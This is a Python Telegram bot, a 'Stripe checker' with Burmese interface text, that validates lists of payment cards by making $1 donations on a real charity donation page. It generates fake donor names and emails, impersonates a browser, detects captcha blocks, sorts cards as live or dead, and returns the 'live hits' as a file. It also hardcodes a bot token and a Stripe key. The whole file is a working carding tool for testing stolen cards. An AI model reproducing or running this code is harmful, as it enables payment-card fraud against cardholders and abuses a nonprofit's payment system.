import uuid
import asyncio
import json
import random
import time
import re
import os
import io
from datetime import datetime
from curl_cffi.requests import AsyncSession
from telegram import Update, Bot
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# ═══════════════════════════════════════════════════════
#  CONFIG
# ═══════════════════════════════════════════════════════
BOT_TOKEN = "8775997110:AAHOKmR0uyBiPQWcUD_BSf0NKrzbcaYD7pM"
MAX_CONCURRENT = 2       # တစ်ပြိုင်နက် စစ်ဆေးနိုင်သော အရေအတွက်
DELAY_BETWEEN = (3, 6)   # Card တစ်ခုနဲ့တစ်ခုကြား delay (seconds)

# ═══════════════════════════════════════════════════════
#  HELPER
# ═══════════════════════════════════════════════════════
def extract_between(s, start, end):
    """Extract text between two delimiters."""
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return ""


def extract_csrf(html):
    """Extract CSRF token with multiple fallback patterns."""
    # Primary method
    token = extract_between(html, 'name="csrf-token" content="', '"')
    if token:
        return token
    # Fallback patterns
    patterns = [
        r'csrf-token["\s]*content="([^"]+)"',
        r'content="([^"]+)"[^>]*name="csrf-token"',
        r'authenticity_token.*?value="([^"]+)"',
        r'"csrf_token":"([^"]+)"',
    ]
    for pat in patterns:
        m = re.search(pat, html)
        if m:
            return m.group(1)
    return ""


def extract_stripe_key(html):
    """Extract Stripe publishable key from page, with hardcoded fallback."""
    m = re.search(r'pk_live_[A-Za-z0-9]+', html)
    if m:
        return m.group(0)
    return 'pk_live_GWQnyoQBA8QSySDV4tPMyOgI'


def extract_page_ids(html):
    """Extract donation_page_context_id and nonprofit_id from page source."""
    ids = {}

    # donation_page_context_id
    m = re.search(r'"donation_page_context_id"\s*:\s*"([a-f0-9-]{36})"', html)
    if m:
        ids['donation_page_context_id'] = m.group(1)
    else:
        ids['donation_page_context_id'] = 'd2ec45c5-4fae-4521-93cf-790c255a2c7c'

    # donation_page_context_type
    m = re.search(r'"donation_page_context_type"\s*:\s*"([^"]+)"', html)
    if m:
        ids['donation_page_context_type'] = m.group(1)
    else:
        ids['donation_page_context_type'] = 'Campaign'

    # nonprofit_id
    m = re.search(r'"nonprofit_id"\s*:\s*"([a-f0-9-]{36})"', html)
    if m:
        ids['nonprofit_id'] = m.group(1)
    else:
        ids['nonprofit_id'] = '5d50ec0d-ceef-4dd8-acdc-d827f24b7429'

    return ids


# ═══════════════════════════════════════════════════════
#  STRIPE CHECKER CORE
# ═══════════════════════════════════════════════════════
async def check_card(full, session):
    try:
        full = full.strip()
        if not full or "|" not in full:
            return "Invalid format ❌"

        parts = full.split("|")
        if len(parts) != 4:
            return "Invalid format (need cc|mm|yyyy|cvv) ❌"

        cc, mm, yyyy, cvv = [p.strip() for p in parts]

        # Validate basic card info
        if not cc.isdigit() or len(cc) < 13:
            return "Invalid card number ❌"
        if not mm.isdigit() or int(mm) < 1 or int(mm) > 12:
            return "Invalid month ❌"
        if not cvv.isdigit() or len(cvv) < 3:
            return "Invalid CVV ❌"

        if len(yyyy) == 2:
            yyyy = f'20{yyyy}'

        first_names = ['James', 'John', 'Robert', 'Michael', 'William',
                       'David', 'Richard', 'Joseph', 'Thomas', 'Charles',
                       'Daniel', 'Matthew', 'Anthony', 'Mark', 'Steven']
        last_names = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones',
                      'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez',
                      'Anderson', 'Taylor', 'Thomas', 'Moore', 'Jackson']

        first_name = random.choice(first_names)
        last_name = random.choice(last_names)
        full_name = f"{first_name} {last_name}"
        mail = f"{first_name.lower()}{last_name.lower()}{random.randint(100, 999)}@gmail.com"

        # ─── Step 1: Visit donation page ───
        try:
            r1 = await session.get(
                'https://secure.givelively.org/donate/sertoma-inc/hearing-aid-project',
                timeout=30
            )
        except Exception as e:
            return f"Connection error: {str(e)[:80]}"

        if r1.status_code != 200:
            return f"Page load failed ({r1.status_code})"

        if 'captcha' in r1.text.lower() or 'geo.captcha-delivery' in r1.text.lower():
            return "Captcha Block ⚠️"

        csrf_token = extract_csrf(r1.text)
        if not csrf_token:
            return "CSRF token not found ⚠️"

        # Dynamic extraction of IDs and Stripe key
        page_ids = extract_page_ids(r1.text)
        stripe_key = extract_stripe_key(r1.text)

        api_headers = {
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            'X-CSRF-Token': csrf_token,
        }

        # ─── Step 2: Create cart ───
        cart_data = {
            'cart_owner': 'default',
            'order_tracking_attributes': {
                'utm_source': None,
                'widget_type': False,
                'widget_url': False,
                'referrer_url': 'https://hearingaiddonations.org/',
                'page_url': None,
            },
            'ref_id': None,
            'donation_page_context_id': page_ids['donation_page_context_id'],
            'donation_page_context_type': page_ids['donation_page_context_type'],
            'items_attributes': [{
                'amount': 100,
                'recurring': False,
                'anonymous_to_public': False,
                'nonprofit_id': page_ids['nonprofit_id'],
                'dedication_attributes': {
                    'name': '',
                    'email': '',
                    'type': '',
                }
            }]
        }

        try:
            r2 = await session.post(
                'https://secure.givelively.org/carts',
                headers=api_headers,
                json=cart_data,
                timeout=30
            )
        except Exception as e:
            return f"Cart request error: {str(e)[:80]}"

        if r2.status_code not in (200, 201):
            if 'captcha' in r2.text.lower():
                return "Captcha Block (cart) ⚠️"
            return f"Cart failed ({r2.status_code})"

        # Extract cart ID with multiple fallbacks
        try:
            cart_resp = r2.json()
            cart_id = None
            # Try: {"cart": {"id": "..."}}
            if 'cart' in cart_resp and isinstance(cart_resp['cart'], dict):
                cart_id = cart_resp['cart'].get('id')
            # Try: {"id": "..."}
            if not cart_id:
                cart_id = cart_resp.get('id')
            # Try: {"data": {"id": "..."}}
            if not cart_id and 'data' in cart_resp:
                cart_id = cart_resp['data'].get('id')
        except (json.JSONDecodeError, AttributeError):
            return "Cart response parse error ⚠️"

        if not cart_id:
            return "Cart ID not found ⚠️"

        # ─── Step 3: Create Stripe Payment Method ───
        stripe_headers = {
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                          'AppleWebKit/537.36 (KHTML, like Gecko) '
                          'Chrome/131.0.0.0 Safari/537.36',
        }

        stripe_payload = {
            'type': 'card',
            'billing_details[name]': full_name,
            'billing_details[email]': mail,
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_month]': mm,
            'card[exp_year]': yyyy,
            'payment_user_agent': 'stripe.js/927f625145; stripe-js-v3/927f625145; card-element',
            'key': stripe_key,
        }

        try:
            r3 = await session.post(
                'https://api.stripe.com/v1/payment_methods',
                headers=stripe_headers,
                data=stripe_payload,
                timeout=30
            )
        except Exception as e:
            return f"Stripe request error: {str(e)[:80]}"

        try:
            pm_data = r3.json()
        except json.JSONDecodeError:
            return f"Stripe response parse error ⚠️"

        if 'error' in pm_data:
            err = pm_data['error']
            code = err.get('decline_code') or err.get('code', '')
            msg = err.get('message', code)
            return f"Declined ❌ {msg}"

        pm = pm_data.get('id')
        if not pm:
            return "Payment Method ID not found ⚠️"

        card_brand = pm_data.get('card', {}).get('brand', 'visa')

        # ─── Step 4: Checkout ───
        checkout_data = {
            'checkout': {
                'name': full_name,
                'email': mail,
                'payment_method_id': pm,
                'payment_method_type': card_brand,
                'transaction_fee_covered': False,
                'tip_amount': 0,
                'order_tracking_attributes': {
                    'utm_source': None,
                    'widget_type': False,
                    'widget_url': False,
                    'referrer_url': 'https://hearingaiddonations.org/',
                    'page_url': None,
                },
                'donor_information': {
                    'address': {
                        'street_address': '123 Main St',
                        'custom_field': '',
                        'administrative_area_level_2': 'New York',
                        'administrative_area_level_1': 'NY',
                        'postal_code': '10001',
                    },
                },
                'answers_attributes': [],
            },
            'anonymous_to_public': False,
            'donation_page_context_id': page_ids['donation_page_context_id'],
            'donation_page_context_type': page_ids['donation_page_context_type'],
            'idempotency_key': str(uuid.uuid4()),
        }

        try:
            r4 = await session.post(
                f'https://secure.givelively.org/carts/{cart_id}/payment_intents/checkout',
                headers=api_headers,
                json=checkout_data,
                timeout=30
            )
        except Exception as e:
            return f"Checkout request error: {str(e)[:80]}"

        resp_text = r4.text

        if 'captcha' in resp_text.lower() or 'geo.captcha-delivery' in resp_text:
            return "Captcha Block (checkout) ⚠️"

        try:
            resp_json = r4.json()

            # Success check
            if 'cart' in resp_json:
                cart_info = resp_json['cart']
                if cart_info.get('checked_out_at'):
                    return "Approved ✅ $1.00"

            # 3DS / requires_action check
            if 'payment_intent' in resp_json:
                pi = resp_json['payment_intent']
                status = pi.get('status', '')
                if status == 'requires_action':
                    return "3DS Required 🔐"
                elif status == 'succeeded':
                    return "Approved ✅ $1.00"

            # Error messages
            if 'message' in resp_json:
                msg = resp_json['message']
                if isinstance(msg, list):
                    msg = ' '.join(msg)
                # Classify common responses
                msg_lower = msg.lower()
                if 'insufficient' in msg_lower:
                    return f"Insufficient Funds 💰 (CCN Live)"
                elif 'stolen' in msg_lower or 'lost' in msg_lower:
                    return f"Stolen/Lost Card ❌ {msg}"
                elif 'do not honor' in msg_lower:
                    return f"Do Not Honor ❌"
                elif 'expired' in msg_lower:
                    return f"Expired Card ❌"
                elif 'incorrect' in msg_lower and 'cvc' in msg_lower:
                    return f"Incorrect CVC ❌ (CCN Live)"
                elif 'security code' in msg_lower:
                    return f"Security Code Error ❌ (CCN Live)"
                elif 'restrict' in msg_lower:
                    return f"Restricted Card ❌"
                elif 'pickup' in msg_lower:
                    return f"Pickup Card ❌"
                elif 'try again' in msg_lower:
                    return f"Try Again Later ⚠️"
                return msg[:200]

            # Fallback: check for error key
            if 'error' in resp_json:
                return f"Error: {str(resp_json['error'])[:200]}"

            return resp_text[:300]

        except json.JSONDecodeError:
            return resp_text[:300]

    except Exception as e:
        return f"Error: {str(e)[:150]}"


# ═══════════════════════════════════════════════════════
#  TELEGRAM BOT HANDLERS
# ═══════════════════════════════════════════════════════

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    welcome = (
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "  💳 𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗲𝗰𝗸𝗲𝗿 𝗕𝗼𝘁\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "📌 <b>အသုံးပြုနည်း:</b>\n\n"
        "1️⃣ <code>.txt</code> ဖိုင်ကို ပို့ပါ\n"
        "   Format: <code>cc|mm|yyyy|cvv</code>\n"
        "   (တစ်လိုင်းလျှင် ကတ်တစ်ခု)\n\n"
        "2️⃣ သို့မဟုတ် ကတ်တစ်ခုတည်းကို\n"
        "   Message အနေနဲ့ တိုက်ရိုက်ပို့ပါ\n"
        "   ဥပမာ: <code>4242424242424242|12|2028|123</code>\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "📊 <b>Commands:</b>\n"
        "/start - Bot စတင်ရန်\n"
        "/help  - အကူအညီ\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "📋 <b>Result Types:</b>\n"
        "✅ Approved - Card Live\n"
        "💰 Insufficient - CCN Live\n"
        "🔐 3DS Required - Card Live\n"
        "❌ Declined - Card Dead\n"
        "⚠️ Error - စစ်ဆေး၍မရ\n"
        "━━━━━━━━━━━━━━━━━━━━━━"
    )
    await update.message.reply_text(welcome, parse_mode='HTML')


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = (
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "  ❓ 𝗛𝗲𝗹𝗽\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "📄 <b>TXT ဖိုင် Format:</b>\n"
        "<code>4242424242424242|12|2028|123</code>\n"
        "<code>5555555555554444|06|2027|456</code>\n\n"
        "📝 <b>Single Card:</b>\n"
        "ကတ်တစ်ခုတည်းကို message ပို့ပါ\n\n"
        "⚡ <b>Features:</b>\n"
        "• TXT ဖိုင်ပို့ရင် အကုန်စစ်ပေးမယ်\n"
        "• Live/Dead/Error ခွဲပြပေးမယ်\n"
        "• စစ်ပြီးရင် Result Summary ပြပေးမယ်\n"
        "• Live ကတ်တွေကို .txt ဖိုင်နဲ့ ပြန်ပို့ပေးမယ်\n"
        "━━━━━━━━━━━━━━━━━━━━━━"
    )
    await update.message.reply_text(help_text, parse_mode='HTML')


async def process_single_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle single card sent as text message."""
    text = update.message.text.strip()

    if "|" not in text:
        return

    parts = text.split("|")
    if len(parts) != 4:
        await update.message.reply_text(
            "❌ Format မှားနေပါတယ်\n"
            "✅ မှန်ကန်သော Format: <code>cc|mm|yyyy|cvv</code>",
            parse_mode='HTML'
        )
        return

    processing_msg = await update.message.reply_text(
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"  🔄 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴...\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"💳 <code>{mask_card(text)}</code>\n"
        f"⏳ စစ်ဆေးနေပါတယ်...\n"
        f"━━━━━━━━━━━━━━━━━━━━━━",
        parse_mode='HTML'
    )

    start_time = time.time()
    async with AsyncSession(impersonate="chrome") as session:
        result = await check_card(text, session)
    elapsed = round(time.time() - start_time, 2)

    status_emoji = get_status_emoji(result)
    status_label = get_status_label(result)

    await processing_msg.edit_text(
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"  {status_emoji} {status_label}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"💳 Card: <code>{mask_card(text)}</code>\n"
        f"📋 Result: <b>{result}</b>\n"
        f"⏱ Time: {elapsed}s\n"
        f"━━━━━━━━━━━━━━━━━━━━━━",
        parse_mode='HTML'
    )


async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle .txt file uploads."""
    document = update.message.document

    if not document.file_name.endswith('.txt'):
        await update.message.reply_text(
            "❌ <code>.txt</code> ဖိုင်သာ လက်ခံပါတယ်",
            parse_mode='HTML'
        )
        return

    # Download file
    file = await context.bot.get_file(document.file_id)
    file_bytes = await file.download_as_bytearray()
    content = file_bytes.decode('utf-8', errors='ignore')
    lines = [line.strip() for line in content.splitlines() if line.strip() and "|" in line]

    if not lines:
        await update.message.reply_text("❌ ဖိုင်ထဲမှာ ကတ်မတွေ့ပါ\nFormat: <code>cc|mm|yyyy|cvv</code>", parse_mode='HTML')
        return

    total = len(lines)

    status_msg = await update.message.reply_text(
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"  📂 𝗙𝗶𝗹𝗲 𝗟𝗼𝗮𝗱𝗲𝗱\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📊 Total Cards: <b>{total}</b>\n"
        f"⏳ Status: <b>Starting...</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━",
        parse_mode='HTML'
    )

    # Results tracking
    results = {
        'live': [],      # Approved, 3DS, Insufficient
        'dead': [],      # Declined
        'error': [],     # Errors
    }
    checked = 0
    start_time = time.time()
    semaphore = asyncio.Semaphore(MAX_CONCURRENT)
    lock = asyncio.Lock()

    async def check_with_semaphore(card_line):
        nonlocal checked
        async with semaphore:
            async with AsyncSession(impersonate="chrome") as session:
                result = await check_card(card_line, session)
            await asyncio.sleep(random.uniform(*DELAY_BETWEEN))

        async with lock:
            checked += 1
            current_checked = checked

        result_str = str(result)
        is_live = any(kw in result_str for kw in [
            "Approved", "Insufficient", "3DS", "CCN Live",
            "Security Code Error", "Incorrect CVC"
        ])

        if is_live:
            results['live'].append((card_line, result))
            # Send live hit notification immediately
            try:
                await update.message.reply_text(
                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"  ✅ 𝗟𝗜𝗩𝗘 𝗛𝗜𝗧!\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"💳 <code>{card_line}</code>\n"
                    f"📋 {result}\n"
                    f"[{current_checked}/{total}]\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━",
                    parse_mode='HTML'
                )
            except Exception:
                pass
        elif "Declined" in result_str or "Expired" in result_str or "Stolen" in result_str or "Do Not Honor" in result_str:
            results['dead'].append((card_line, result))
        else:
            results['error'].append((card_line, result))

        # Update progress every 2 cards or at the end
        if current_checked % 2 == 0 or current_checked == total:
            elapsed = round(time.time() - start_time, 2)
            progress_bar = create_progress_bar(current_checked, total)
            try:
                await status_msg.edit_text(
                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"  ⏳ 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴...\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"{progress_bar} {current_checked}/{total}\n\n"
                    f"✅ Live: <b>{len(results['live'])}</b>\n"
                    f"❌ Dead: <b>{len(results['dead'])}</b>\n"
                    f"⚠️ Error: <b>{len(results['error'])}</b>\n"
                    f"⏱ Time: {elapsed}s\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━",
                    parse_mode='HTML'
                )
            except Exception:
                pass  # Ignore Telegram edit rate limit

    # Run all cards with concurrency control
    tasks = [check_with_semaphore(line) for line in lines]
    await asyncio.gather(*tasks)

    # Final summary
    total_time = round(time.time() - start_time, 2)

    summary = (
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"  📊 𝗙𝗶𝗻𝗮𝗹 𝗦𝘂𝗺𝗺𝗮𝗿𝘆\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📁 Total: <b>{total}</b>\n"
        f"✅ Live: <b>{len(results['live'])}</b>\n"
        f"❌ Dead: <b>{len(results['dead'])}</b>\n"
        f"⚠️ Error: <b>{len(results['error'])}</b>\n"
        f"⏱ Total Time: <b>{total_time}s</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━"
    )

    await update.message.reply_text(summary, parse_mode='HTML')

    # Send hits file if any
    if results['live']:
        hits_content = "\n".join(
            [f"{card} | {res}" for card, res in results['live']]
        )
        hits_file = io.BytesIO(hits_content.encode('utf-8'))
        hits_file.name = f"hits_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        await update.message.reply_document(
            document=hits_file,
            caption=f"✅ Live Cards ({len(results['live'])} hits)"
        )


# ═══════════════════════════════════════════════════════
#  UTILITY FUNCTIONS
# ═══════════════════════════════════════════════════════

def mask_card(card_str):
    """Mask card number for display: 4242****4242|12|2028|***"""
    try:
        parts = card_str.split("|")
        cc = parts[0].strip()
        if len(cc) >= 8:
            masked_cc = cc[:6] + "****" + cc[-4:]
        else:
            masked_cc = cc
        return f"{masked_cc}|{parts[1].strip()}|{parts[2].strip()}|***"
    except (IndexError, ValueError):
        return card_str


def get_status_emoji(result):
    result_str = str(result)
    if any(kw in result_str for kw in ["Approved", "Insufficient", "3DS", "CCN Live"]):
        return "✅"
    elif "Declined" in result_str or "Expired" in result_str or "Do Not Honor" in result_str:
        return "❌"
    else:
        return "⚠️"


def get_status_label(result):
    result_str = str(result)
    if "Approved" in result_str:
        return "𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗"
    elif "Insufficient" in result_str or "CCN Live" in result_str:
        return "𝗖𝗖𝗡 𝗟𝗜𝗩𝗘"
    elif "3DS" in result_str:
        return "𝟯𝗗𝗦 𝗟𝗜𝗩𝗘"
    elif "Declined" in result_str or "Do Not Honor" in result_str:
        return "𝗗𝗘𝗔𝗗"
    else:
        return "𝗥𝗘𝗦𝗨𝗟𝗧"


def create_progress_bar(current, total, length=10):
    filled = int(length * current / total) if total > 0 else 0
    bar = "█" * filled + "░" * (length - filled)
    percent = int(100 * current / total) if total > 0 else 0
    return f"[{bar}] {percent}%"


# ═══════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════

def main():
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("  💳 Stripe Checker Bot v2.0")
    print("  Starting...")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

    app = Application.builder().token(BOT_TOKEN).build()

    # Command handlers
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("help", help_command))

    # File handler (for .txt uploads)
    app.add_handler(MessageHandler(filters.Document.ALL, process_file))

    # Text handler (for single card messages)
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_single_card))

    print("  Bot is running!")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
